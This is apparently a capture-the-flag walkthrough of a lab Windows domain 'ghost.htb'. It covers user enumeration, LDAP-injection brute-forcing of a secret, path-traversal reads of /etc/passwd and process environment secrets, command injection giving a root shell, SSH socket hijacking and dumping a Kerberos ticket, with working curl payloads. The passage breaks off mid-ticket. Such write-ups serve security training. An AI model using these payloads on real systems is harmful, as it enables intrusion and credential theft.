# Host file setup
```python
sudo nxc smb 10.129.231.105 --generate-hosts-file /etc/hosts
 
SMB         10.129.231.105  445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:ghost.htb) (signing:True) (SMBv1:None) (Null Auth:True)
```

# Enumeration
## Open ports
```python
nmap -p- --min-rate=2000 -sT dc01.ghost.htb        
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-25 16:40 +0100
Nmap scan report for dc01.ghost.htb (10.129.231.105)
Host is up (0.013s latency).
rDNS record for 10.129.231.105: DC01.ghost.htb
Not shown: 65508 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
443/tcp   open  https
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
1433/tcp  open  ms-sql-s
2179/tcp  open  vmrdp
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
3389/tcp  open  ms-wbt-server
5985/tcp  open  wsman
8008/tcp  open  http
8443/tcp  open  https-alt
9389/tcp  open  adws
49443/tcp open  unknown
49664/tcp open  unknown
49672/tcp open  unknown
49681/tcp open  unknown
63211/tcp open  unknown
63351/tcp open  unknown
64506/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 66.27 seconds
```

Looks like there is port `2179` open, which means there is likely some virtualization
## Nmap
```python
nmap -p 53,80,88,135,139,389,443,445,464,593,636,1433,2179,3268,3269,3389,5985,8008,8443,9389 -A --min-rate=2000 -sT dc01.ghost.htb
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-25 16:44 +0100
Nmap scan report for dc01.ghost.htb (10.129.231.105)
Host is up (0.013s latency).
rDNS record for 10.129.231.105: DC01.ghost.htb

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-08-25 15:44:34Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: ghost.htb, Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC01.ghost.htb
| Subject Alternative Name: DNS:DC01.ghost.htb, DNS:ghost.htb
| Not valid before: 2024-06-19T15:45:56
|_Not valid after:  2124-06-19T15:55:55
443/tcp  open  https?
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: ghost.htb, Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC01.ghost.htb
| Subject Alternative Name: DNS:DC01.ghost.htb, DNS:ghost.htb
| Not valid before: 2024-06-19T15:45:56
|_Not valid after:  2124-06-19T15:55:55
1433/tcp open  ms-sql-s      Microsoft SQL Server 2022 16.00.1000.00; RTM
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2026-08-25T15:36:31
|_Not valid after:  2056-08-25T15:36:31
| ms-sql-ntlm-info: 
|   10.129.231.105:1433: 
|     Target_Name: GHOST
|     NetBIOS_Domain_Name: GHOST
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: ghost.htb
|     DNS_Computer_Name: DC01.ghost.htb
|     DNS_Tree_Name: ghost.htb
|_    Product_Version: 10.0.20348
|_ssl-date: 2026-08-25T15:45:59+00:00; 0s from scanner time.
| ms-sql-info: 
|   10.129.231.105:1433: 
|     Version: 
|       name: Microsoft SQL Server 2022 RTM
|       number: 16.00.1000.00
|       Product: Microsoft SQL Server 2022
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
2179/tcp open  vmrdp?
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: ghost.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.ghost.htb
| Subject Alternative Name: DNS:DC01.ghost.htb, DNS:ghost.htb
| Not valid before: 2024-06-19T15:45:56
|_Not valid after:  2124-06-19T15:55:55
|_ssl-date: TLS randomness does not represent time
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: ghost.htb, Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC01.ghost.htb
| Subject Alternative Name: DNS:DC01.ghost.htb, DNS:ghost.htb
| Not valid before: 2024-06-19T15:45:56
|_Not valid after:  2124-06-19T15:55:55
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2026-08-25T15:45:59+00:00; +1s from scanner time.
| ssl-cert: Subject: commonName=DC01.ghost.htb
| Not valid before: 2026-08-24T15:33:38
|_Not valid after:  2027-02-23T15:33:38
| rdp-ntlm-info: 
|   Target_Name: GHOST
|   NetBIOS_Domain_Name: GHOST
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: ghost.htb
|   DNS_Computer_Name: DC01.ghost.htb
|   DNS_Tree_Name: ghost.htb
|   Product_Version: 10.0.20348
|_  System_Time: 2026-08-25T15:45:18+00:00
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
8008/tcp open  http          nginx 1.18.0 (Ubuntu)
|_http-generator: Ghost 5.78
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Ghost
| http-robots.txt: 5 disallowed entries 
|_/ghost/ /p/ /email/ /r/ /webmentions/receive/
8443/tcp open  ssl/http      nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-title: Ghost Core
|_Requested resource was /login
| tls-alpn: 
|_  http/1.1
| tls-nextprotoneg: 
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=core.ghost.htb
| Subject Alternative Name: DNS:core.ghost.htb
| Not valid before: 2024-06-18T15:14:02
|_Not valid after:  2124-05-25T15:14:02
9389/tcp open  mc-nmf        .NET Message Framing
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2022|10|11|2012|2016 (89%)
OS CPE: cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_10 cpe:/o:microsoft:windows_11 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016
Aggressive OS guesses: Microsoft Windows Server 2022 (89%), Microsoft Windows 10 1703 or Windows 11 21H2 - 23H2 (85%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2016 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: DC01; OSs: Windows, Linux; CPE: cpe:/o:microsoft:windows, cpe:/o:linux:linux_kernel
```

# SMB (445)
Null auth is enabled but not able to list shares or users with it

The guest account is disabled!

# HTTP (80)

![](Pasted%20image%2020260825165604.png)

Landing page just looks like a 404, however i dont think its a default 404 page

There are no subdomains

Feroxbuster did not find anything

Nuclei did not find anything

# HTTP (443)

This site wont load, over either http or https, theres not a lot i can do with it right now

# HTTP (8008)

![](Pasted%20image%2020260825171258.png)

Looks like a CMS of some sort called Ghost

Potential user `kathryn.holland`?

Opening the post, i can see the author `kathryn.holland` has a page inside `/author/`, its possible i can use this to find valid users

![](Pasted%20image%2020260825171334.png)

Using wappalyzer i can see that this service is being run off an ubuntu machine, this is likely the virtualization i mentioned earlier

```python
nxc smb dc01.ghost.htb -u kathryn.holland -p '' -k
SMB         dc01.ghost.htb  445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:ghost.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         dc01.ghost.htb  445    DC01             [-] ghost.htb\kathryn.holland: KDC_ERR_PREAUTH_FAILED
```

Using kerberos i am able to use error output to determine valid users, looks like `kathryn.holland` is a valid domain user, this give me a valid username format
## Nuclei 
```python
nuclei -u http://ghost.htb:8008/ -rl 50 

[CVE-2022-41697] [http] [medium] http://ghost.htb:8008/ghost/api/admin/session
```

Found a CVE

## CVE-2022-41697

> A user enumeration vulnerability exists in the login functionality of Ghost Foundation Ghost 5.9.4. A specially-crafted HTTP request can lead to a disclosure of sensitive information. An attacker can send a series of HTTP requests to trigger this vulnerability.

https://talosintelligence.com/vulnerability_reports/TALOS-2022-1625

```python
curl -X POST http://ghost.htb:8008/ghost/api/admin/session -H 'Content-Type: application/json' --data '{"username":"lkjasdfklasjdf@asdf.com","password":"asdfasdfasdf"}' | jq .
  % Total    % Received % Xferd  Average Speed  Time    Time    Time   Current
                                 Dload  Upload  Total   Spent   Left   Speed
100    291 100    227 100     64   2705    762                              0
{
  "errors": [
    {
      "message": "There is no user with that email address.",
      "context": null,
      "type": "NotFoundError",
      "details": null,
      "property": null,
      "help": null,
      "code": null,
      "id": "8523fb70-a0a2-11f1-a02f-09a7d9773575",
      "ghostErrorCode": null
    }
  ]
}
```

Ill use the example POC in the article and see the error, this indicates this user doesnt exist

```python
curl -X POST http://ghost.htb:8008/ghost/api/admin/session -H 'Content-Type: application/json' --data '{"username":"kathryn.holland@ghost.htb","password":"asdfasdfasdf"}'
{"errors":[{"message":"Your password is incorrect.","context":"Your password is incorrect.","type":"ValidationError","details":null,"property":null,"help":"Visit and save your profile after logging in to check for problems.","code":"PASSWORD_INCORRECT","id":"71ce7d20-a0a2-11f1-a02f-09a7d9773575","ghostErrorCode":null}]}
```

But if i now test this POC with a user i know exists, i can see i get an error `Your password is incorrect` confirming the POC works

Another thing to note, the API is using domain credentials, since i know the user `kathryn.holland` is a domain user

```python
curl -X POST http://ghost.htb:8008/ghost/api/admin/session -H 'Content-Type: application/json' --data '{"username":"kathryn.holland@ghost.htb","password":"asdfasdfasdf"}' | jq . 
  % Total    % Received % Xferd  Average Speed  Time    Time    Time   Current
                                 Dload  Upload  Total   Spent   Left   Speed
100    394 100    328 100     66   4522    909                              0
{
  "errors": [
    {
      "message": "Too many login attempts. Please wait 3 minutes before trying again, or reset your password.",
      "context": "Too many login attempts.",
      "type": "TooManyRequestsError",
      "details": null,
      "property": null,
      "help": "Too many login attempts.",
      "code": null,
      "id": "898d7aa0-a0a3-11f1-a02f-09a7d9773575",
      "ghostErrorCode": null
    }
  ]
}
```

If i send another request i see, there is a error for too many logon attempts, this prevents me from fuzzing the application to find valid users. But since the application is using domain credentials, kerbrute will work fine to enumerate users

## Ghost logon form

![](Pasted%20image%2020260825174803.png)

When trying the logon, it uses that session endpoint, used above to try and find valid users

The forgot password function, doesnt actually send a request anywhere, eventually the request times out

## Subdomains
```python
ffuf -u http://ghost.htb:8008/ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H 'Host: FUZZ.ghost.htb' -ic -c -t 30 -fs 7676 

intranet                [Status: 307, Size: 3968, Words: 52, Lines: 1, Duration: 239ms]
```

Found an intranet subdomain

# Access to the `intranet` subdomain on port 8008

Using simple ldap injection 

```python
Username: *
Password: *
```

I got access

![](Pasted%20image%2020260825182240.png)

I am logged in as `kathryn.holland`

Also some interesting info on the homescreen

![1203](Pasted%20image%2020260826165723.png)

Some info on more users, thise looks to be domain users too!

![1324](Pasted%20image%2020260826170046.png)

Found another subdomain `bitbucket.ghost.htb`

The bitbucket subdomain doesnt show anything, as shown in the screenshot above, the DNS entry is not configured

There is not a lot of functionality in this site, mostly just information

So i will safely assume there is a gitea subdomain, in all fairness im surprised none of these wordlists ive used contain gitea in them

# `gitea` subdomain

![](Pasted%20image%2020260826175125.png)

I have found the gitea install

![](Pasted%20image%2020260826175216.png)

Found the gitea version

I can also use `Explore` in the top left of the sight to view as a guest

![](Pasted%20image%2020260826175318.png)

Found some users

There is no repos or archived repos, ive tried using some default credentials but no luck

Im thinking i can use the LDAP injection on the intranet subdomain to pull out the secret, becuase remembering back it said domain logons were disabled, but i could log on to gitea using the secret and it could be found in LDAP

Ill prixy this request using caido

# LDAP injection to find `gitea_temp_principal` secret

```python
POST /login HTTP/1.1
Host: intranet.ghost.htb:8008
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/x-component
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://intranet.ghost.htb:8008/login
Next-Action: c471eb076ccac91d6f828b671795550fd5925940
Next-Router-State-Tree: %5B%22%22%2C%7B%22children%22%3A%5B%22login%22%2C%7B%22children%22%3A%5B%22__PAGE__%22%2C%7B%7D%5D%7D%5D%7D%2Cnull%2Cnull%2Ctrue%5D
Content-Type: multipart/form-data; boundary=----geckoformboundary7d9e9ef2cf79193384b4632ed29c67f1
Content-Length: 478
Origin: http://intranet.ghost.htb:8008
Connection: keep-alive
Priority: u=0

------geckoformboundary7d9e9ef2cf79193384b4632ed29c67f1
Content-Disposition: form-data; name="1_ldap-username"

gitea_temp_principal
------geckoformboundary7d9e9ef2cf79193384b4632ed29c67f1
Content-Disposition: form-data; name="1_ldap-secret"

*
------geckoformboundary7d9e9ef2cf79193384b4632ed29c67f1
Content-Disposition: form-data; name="0"

[{},"$K1"]
------geckoformboundary7d9e9ef2cf79193384b4632ed29c67f1--
```

Using the target account set as the username, a `*` will search through the attributes until it find a match to `gitea_temp_principal`

So by placing a character in the password field followed by a `*` will either give an error for a incorrect character or a success for a correct character

```python
HTTP/1.1 303 See Other
Server: nginx/1.18.0 (Ubuntu)
Date: Wed, 26 Aug 2026 19:27:21 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 2
Connection: keep-alive
Vary: RSC, Next-Router-State-Tree, Next-Router-Prefetch, Next-Url, Accept-Encoding
Cache-Control: no-cache, no-store, max-age=0, must-revalidate
Set-Cookie: token=Bearer%20eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE3OTAzNjQ0NDEsImlhdCI6MTc4Nzc3MjQ0MSwidXNlciI6eyJ1c2VybmFtZSI6ImdpdGVhX3RlbXBfcHJpbmNpcGFsIn19.sksmk-WdJMLIhYqRnM-3i7lRh0ho_9LR6x4O-Uwo1QA; Path=/
x-action-revalidated: [[],0,1]
x-action-redirect: /
X-Powered-By: Next.js
ETag: "bwc9mymkdm2"

{}
```

This is what a valid request looks like just using the `*` in the secret field

So i already know it can only contain letters and numbers from the `/profile` endpoint:

![](Pasted%20image%2020260826202843.png)

So i can use a character wordlist to find the correct secret

Ill create a wordlist to do this

```python
POST /login HTTP/1.1
Host: intranet.ghost.htb:8008
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/x-component
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://intranet.ghost.htb:8008/login
Next-Action: c471eb076ccac91d6f828b671795550fd5925940
Next-Router-State-Tree: %5B%22%22%2C%7B%22children%22%3A%5B%22login%22%2C%7B%22children%22%3A%5B%22__PAGE__%22%2C%7B%7D%5D%7D%5D%7D%2Cnull%2Cnull%2Ctrue%5D
Content-Type: multipart/form-data; boundary=----geckoformboundary7d9e9ef2cf79193384b4632ed29c67f1
Content-Length: 478
Origin: http://intranet.ghost.htb:8008
Connection: keep-alive
Priority: u=0

------geckoformboundary7d9e9ef2cf79193384b4632ed29c67f1
Content-Disposition: form-data; name="1_ldap-username"

gitea_temp_principal
------geckoformboundary7d9e9ef2cf79193384b4632ed29c67f1
Content-Disposition: form-data; name="1_ldap-secret"

FUZZ*
------geckoformboundary7d9e9ef2cf79193384b4632ed29c67f1
Content-Disposition: form-data; name="0"

[{},"$K1"]
------geckoformboundary7d9e9ef2cf79193384b4632ed29c67f1--
```

Ill grab the request and upload it to caido so i can fuzz this in caido

![](Pasted%20image%2020260826205015.png)

As seen here the letter `s` gives a different response length

I also dont think it is case sensitive

![](Pasted%20image%2020260826205125.png)

Now its followed by `z`, ill continue this process until it all characters return the same response length i.e. they all cause errors

```python
szrr8kpc3z6onlqf
```

![](Pasted%20image%2020260826205622.png)

After re running this until all responses had the same length i find the secret, now i can log into the gitea instance

# Access to gitea instance as `gitea_temp_principal`

![](Pasted%20image%2020260826205813.png)

Found two private repos

There are no hardcoded credentials

Ill have a look through some of this source code

# Local file inclusion in the blog 

After running some analysis on the source code in both repos, i found two interesting vulnerabilities, one which is RCE in intranet but it is currently locked and needs a value called `DEV_INTRANET_KEY` which i dont yet have

But there is another vulnerability in the blog which is a file inclusion vulnerability in `posts-public.js` 

```python
const extra = frame.original.query?.extra;
if (extra) {
    const fs = require("fs");
    if (fs.existsSync(extra)) {
        const fileContent = fs.readFileSync("/var/lib/ghost/extra/" + extra, { encoding: "utf8" });
        posts.meta.extra = { [extra]: fileContent };
    }
}
```

I should be able to exploit this file read vulnerability using the API key give in the blogs readme

```python
a5af628828958c976a3b6cc81a
```

I will now attempt to read `/etc/passwd`

```python
curl 'http://ghost.htb:8008/ghost/api/content/posts/?key=a5af628828958c976a3b6cc81a&extra=../../../../etc/passwd'         
{"posts":[{"id":"65bdd2dc26db7d00010704b5","uuid":"22db47b3-bbf6-426d-9fcf-887363df82cf","title":"Embarking on the Supernatural Journey: Welcome to Ghost!","slug":"embarking-on-the-supernatural-journey-welcome-to-ghost","html":"<p>Greetings, fellow seekers of the unknown!</p><p>It is with great excitement and a touch of trepidation that we welcome you to the digital realm of Ghost, your go-to destination for unraveling the mysteries that lie beyond the veil of the ordinary. As we embark on this supernatural journey together, allow us to extend our hand and guide you through the shadowy corridors of the unexplained.</p><h2 id=\"why-ghost\">Why Ghost?</h2><p>The quest to understand the supernatural has been etched into the fabric of human history. From ancient legends to modern-day tales, the fascination with ghosts and the paranormal is a thread that binds us across time and cultures. Ghost emerges as a beacon for those who yearn to explore the realms beyond our comprehension.</p><h2 id=\"what-to-expect\">What to Expect</h2><p>Our digital abode is more than just a collection of stories; it's a haven for the curious, the intrepid, and the inquisitive. Here, you'll find:</p><ol><li><strong>Investigative Chronicles</strong>: Join us as we recount our journeys into haunted locations, sharing the spine-chilling encounters, unexplained phenomena, and the secrets that linger in the darkness.</li><li><strong>Tech Tuesdays</strong>: Stay at the forefront of paranormal research with our weekly dives into the latest ghost-hunting gadgets, software, and techniques. Knowledge is our strongest ally in the face of the unknown.</li><li><strong>Spotlight Series</strong>: Get to know the passionate individuals behind the investigations. Our Spotlight Series puts a face to the name, sharing the stories and expertise of our dedicated team.</li><li><strong>Community Corner</strong>: Ghost is more than a website; it's a community. Share your own supernatural experiences, theories, and questions in our Community Corner. Together, we amplify the voices seeking to understand the inexplicable.</li></ol><h2 id=\"join-us-on-this-extraordinary-expedition\">Join Us on this Extraordinary Expedition</h2><p>The journey into the paranormal is not for the faint of heart, but it is a journey worth taking. As we lift the veil on the mysteries that surround us, we invite you to be an active participant in this extraordinary expedition. Engage with our content, share your thoughts, and let the spirit of exploration guide us into uncharted territories.</p><p>Ghost is not just a website; it's a portal to the enigmatic, a gateway to the supernatural, and a testament to the boundless curiosity that defines the human spirit.</p><p>Welcome to our realm. Let the haunting begin!</p><p>Happy ghost hunting,</p><p>The Ghost Team</p>","comment_id":"659cdeec9cd6330001baefbf","feature_image":null,"featured":true,"visibility":"public","created_at":"2024-01-09T05:51:40.000+00:00","updated_at":"2024-01-09T05:52:59.000+00:00","published_at":"2024-01-09T05:52:29.000+00:00","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null,"url":"http://ghost.htb/embarking-on-the-supernatural-journey-welcome-to-ghost/","excerpt":"Greetings, fellow seekers of the unknown!\n\nIt is with great excitement and a touch of trepidation that we welcome you to the digital realm of Ghost, your go-to destination for unraveling the mysteries that lie beyond the veil of the ordinary. As we embark on this supernatural journey together, allow us to extend our hand and guide you through the shadowy corridors of the unexplained.\n\n\nWhy Ghost?\n\nThe quest to understand the supernatural has been etched into the fabric of human history. From anc","reading_time":1,"access":true,"comments":false,"og_image":null,"og_title":null,"og_description":null,"twitter_image":null,"twitter_title":null,"twitter_description":null,"meta_title":null,"meta_description":null,"email_subject":null,"frontmatter":null,"feature_image_alt":null,"feature_image_caption":null}],"meta":{"pagination":{"page":1,"limit":15,"pages":1,"total":1,"next":null,"prev":null},"extra":{"../../../../etc/passwd":"root:x:0:0:root:/root:/bin/ash\nbin:x:1:1:bin:/bin:/sbin/nologin\ndaemon:x:2:2:daemon:/sbin:/sbin/nologin\nadm:x:3:4:adm:/var/adm:/sbin/nologin\nlp:x:4:7:lp:/var/spool/lpd:/sbin/nologin\nsync:x:5:0:sync:/sbin:/bin/sync\nshutdown:x:6:0:shutdown:/sbin:/sbin/shutdown\nhalt:x:7:0:halt:/sbin:/sbin/halt\nmail:x:8:12:mail:/var/mail:/sbin/nologin\nnews:x:9:13:news:/usr/lib/news:/sbin/nologin\nuucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin\noperator:x:11:0:operator:/root:/sbin/nologin\nman:x:13:15:man:/usr/man:/sbin/nologin\npostmaster:x:14:12:postmaster:/var/mail:/sbin/nologin\ncron:x:16:16:cron:/var/spool/cron:/sbin/nologin\nftp:x:21:21::/var/lib/ftp:/sbin/nologin\nsshd:x:22:22:sshd:/dev/null:/sbin/nologin\nat:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin\nsquid:x:31:31:Squid:/var/cache/squid:/sbin/nologin\nxfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin\ngames:x:35:35:games:/usr/games:/sbin/nologin\ncyrus:x:85:12::/usr/cyrus:/sbin/nologin\nvpopmail:x:89:89::/var/vpopmail:/sbin/nologin\nntp:x:123:123:NTP:/var/empty:/sbin/nologin\nsmmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin\nguest:x:405:100:guest:/dev/null:/sbin/nologin\nnobody:x:65534:65534:nobody:/:/sbin/nologin\nnode:x:1000:1000:Linux User,,,:/home/node:/bin/sh\n"}}}  
```

As seen here, at the bottom of the output i can read files, which means i should be able to dump the `DEV_INTRANET_KEY` to then get RCE

```python
curl 'http://ghost.htb:8008/ghost/api/content/posts/?key=a5af628828958c976a3b6cc81a&extra=../../../../var/lib/ghost/extra/important' 

...[SNIP]...

"extra":{"../../../../var/lib/ghost/extra/important":"659cdeec9cd6330001baefbf\n"}}}  
```

> This value is a 24-character hex string — exactly the length/format of a **Ghost Admin API integration ID** (Ghost's Admin API keys are formatted as `id:secret`, where `id` is a 24-char hex Mongo-style ObjectId and `secret` is a 64-char hex HMAC key)

So i have the ID now i need to get the secret part, i can use both repos and see if there is any interesting hard coded paths where this string might be

![](Pasted%20image%2020260827175100.png)

So from this screenshot i can assume the database is at the path: `/var/lib/ghost/content/data/ghost.db`

Upon output of this file, i see it is massive and would be a pain to find the exact value i want, so instead ill check `/proc/self/environ` since its exported as an environment variable in the repo

```python
curl 'http://ghost.htb:8008/ghost/api/content/posts/?key=a5af628828958c976a3b6cc81a&extra=../../../../proc/self/environ'

...[SNIP]...

"extra":{"../../../../proc/self/environ":"HOSTNAME=26ae7990f3dd\u0000database__debug=false\u0000YARN_VERSION=1.22.19\u0000PWD=/var/lib/ghost\u0000NODE_ENV=production\u0000database__connection__filename=content/data/ghost.db\u0000HOME=/home/node\u0000database__client=sqlite3\u0000url=http://ghost.htb\u0000DEV_INTRANET_KEY=!@yqr!X2kxmQ.@Xe\u0000database__useNullAsDefault=true\u0000GHOST_CONTENT=/var/lib/ghost/content\u0000SHLVL=0\u0000GHOST_CLI_VERSION=1.25.3\u0000GHOST_INSTALL=/var/lib/ghost\u0000PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\u0000NODE_VERSION=18.19.0\u0000GHOST_VERSION=5.78.0\u0000"
```

I now have the `DEV_INTRANET_KEY`

```python
DEV_INTRANET_KEY=!@yqr!X2kxmQ.@Xe
```

# Remote code execution on the Ubuntu server

```python
// Scans an url inside a blog post
// This will be called by the blog to ensure all URLs in posts are safe
#[post("/scan", format = "json", data = "<data>")]
pub fn scan(_guard: DevGuard, data: Json<ScanRequest>) -> Json<ScanResponse> {
    // currently intranet_url_check is not implemented,
    // but the route exists for future compatibility with the blog
    let result = Command::new("bash")
        .arg("-c")
        .arg(format!("intranet_url_check {}", data.url))
        .output();
```

This code is in the intranet repo, specifically `intranet/backend/src/api/dev/scan.rs`

This code takes json input from the POST request and processes it using bash, this is the RCE vector i mentioned earlier in the `/scan` endpoint

Anything placed inside `{"url":"<value>"}` will be ran with bash

```python
use rocket::http::Status;
use rocket::Request;
use rocket::request::{FromRequest, Outcome};

pub(crate) mod scan;

pub struct DevGuard;

#[rocket::async_trait]
impl<'r> FromRequest<'r> for DevGuard {
    type Error = ();

    async fn from_request(request: &'r Request<'_>) -> Outcome<Self, Self::Error> {
        let key = request.headers().get_one("X-DEV-INTRANET-KEY");
        match key {
            Some(key) => {
                if key == std::env::var("DEV_INTRANET_KEY").unwrap() {
                    Outcome::Success(DevGuard {})
                } else {
                    Outcome::Error((Status::Unauthorized, ()))
                }
            },
            None => Outcome::Error((Status::Unauthorized, ()))
        }
    }
}
```

However this was the code that meant i couldnt reach the endpoint to get RCE without the `DEV_INTRANET_KEY` which was stored an environment variable, which i now have through LFI

As seen in this code stored at `intranet/backend/src/api/dev.rs` it takes the environments variable as a HTTP header in the request to the endpoint then matches the value to the environment variable if it matches you can reach the endpoint if not it returns an error

![](Pasted%20image%2020260827190048.png)

This screenshot from the intranet repo readme shows the API is at `/api-dev` and i already know the vulnerable endpoint is `/scan`, so the endpoint is going to be `/api-dev/scan`

```python
curl -X POST http://intranet.ghost.htb:8008/api-dev/scan -H 'Content-Type: application/json' -H 'X-DEV-INTRANET-KEY: !@yqr!X2kxmQ.@Xe' --data '{"url":"http://localhost; id"}' | jq .
  % Total    % Received % Xferd  Average Speed  Time    Time    Time   Current
                                 Dload  Upload  Total   Spent   Left   Speed
100    217 100    187 100     30   4110    659                              0
{
  "is_safe": true,
  "temp_command_success": true,
  "temp_command_stdout": "uid=0(root) gid=0(root) groups=0(root)\n",
  "temp_command_stderr": "bash: line 1: intranet_url_check: command not found\n"
}
```

I now have RCE

All i needed to do was set the request to POST like it says to do in `scan.rs` and pass the valid key found via LFI as well as the content type header, then simply pass the command into the json body

Its also worth noting the app is already running as root so after getting a shell i shouldnt need to do any priv esc

```python
penelope -p 1337
```

So ill start a listener

![](Pasted%20image%2020260827190635.png)

Ill send the request

![](Pasted%20image%2020260827190732.png)

I now have a root shell on the container running on the ubuntu server

# Access as `florence.ramirez` on the ubuntu server (container escape)

```python
root@36b733906694:~/.ssh/controlmaster# ls -la
total 12
drwxr-xr-x 1 root root 4096 Aug 27 15:51 .
drwxr-xr-x 1 root root 4096 Jul  5  2024 ..
srw------- 1 root root    0 Aug 27 15:51 florence.ramirez@ghost.htb@dev-workstation:22
```

I have found a controlmaster socket file for a user called `florence.ramirez`

```python
root@36b733906694:~# ssh -S ~/.ssh/controlmaster/florence.ramirez@ghost.htb@dev-workstation:22 florence.ramirez@ghost.htb
Last login: Thu Feb  1 23:58:45 2024 from 172.18.0.1
florence.ramirez@LINUX-DEV-WS01:~$
```

I can use this to login to the machine, now escaping the container

```python
florence.ramirez@LINUX-DEV-WS01:/$ id
uid=50(florence.ramirez) gid=50(staff) groups=50(staff),51(it)
```

I am part of two interesting groups

```python
florence.ramirez@LINUX-DEV-WS01:/$ find / -group it 2>/dev/null
```

There are no files belonging to the IT group

```python
florence.ramirez@LINUX-DEV-WS01:/$ find / -group staff 2>/dev/null

...[SNIP]...

/tmp/krb5cc_50
```

Looks like i have found a kerberos ticket

```python
florence.ramirez@LINUX-DEV-WS01:/$ klist
Ticket cache: FILE:/tmp/krb5cc_50
Default principal: florence.ramirez@GHOST.HTB

Valid starting     Expires            Service principal
08/27/26 18:42:01  08/28/26 04:42:01  krbtgt/GHOST.HTB@GHOST.HTB
	renew until 08/28/26 18:42:01
florence.ramirez@LINUX-DEV-WS01:/$
```

Ill use this ticket to get initial access the domain!

# Initial access on the domain

```python
florence.ramirez@LINUX-DEV-WS01:/$ cat /tmp/krb5cc_50 | base64
BQQADAABAAgAAAAAAAAAAAAAAAEAAAABAAAACUdIT1NULkhUQgAAABBmbG9yZW5jZS5yYW1pcmV6
AAAAAQAAAAEAAAAJR0hPU1QuSFRCAAAAEGZsb3JlbmNlLnJhbWlyZXoAAAABAAAAAwAAAAxYLUNB
Q0hFQ09ORjoAAAAVa3JiNV9jY2FjaGVfY29uZl9kYXRhAAAAB3BhX3R5cGUAAAAaa3JidGd0L0dI
T1NULkhUQkBHSE9TVC5IVEIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEy
AAAAAAAAAAEAAAABAAAACUdIT1NULkhUQgAAABBmbG9yZW5jZS5yYW1pcmV6AAAAAgAAAAIAAAAJ
R0hPU1QuSFRCAAAABmtyYnRndAAAAAlHSE9TVC5IVEIAEgAAACDmyc3MnGrK7lXi5kFU8wiWTYy0
pJkz8NtRZjBwH30WbGqQhiZqkIYmapESxmqR16YAAOEAAAAAAAAAAAAAAAAE6mGCBOYwggTioAMC
AQWhCxsJR0hPU1QuSFRCoh4wHKADAgECoRUwExsGa3JidGd0GwlHSE9TVC5IVEKjggSsMIIEqKAD
AgESoQMCAQKiggSaBIIEls1QOW0Pf5j051iCVxmKPKIwQxkln67XpSZizurXH5kTgc4wCbXeaDs9
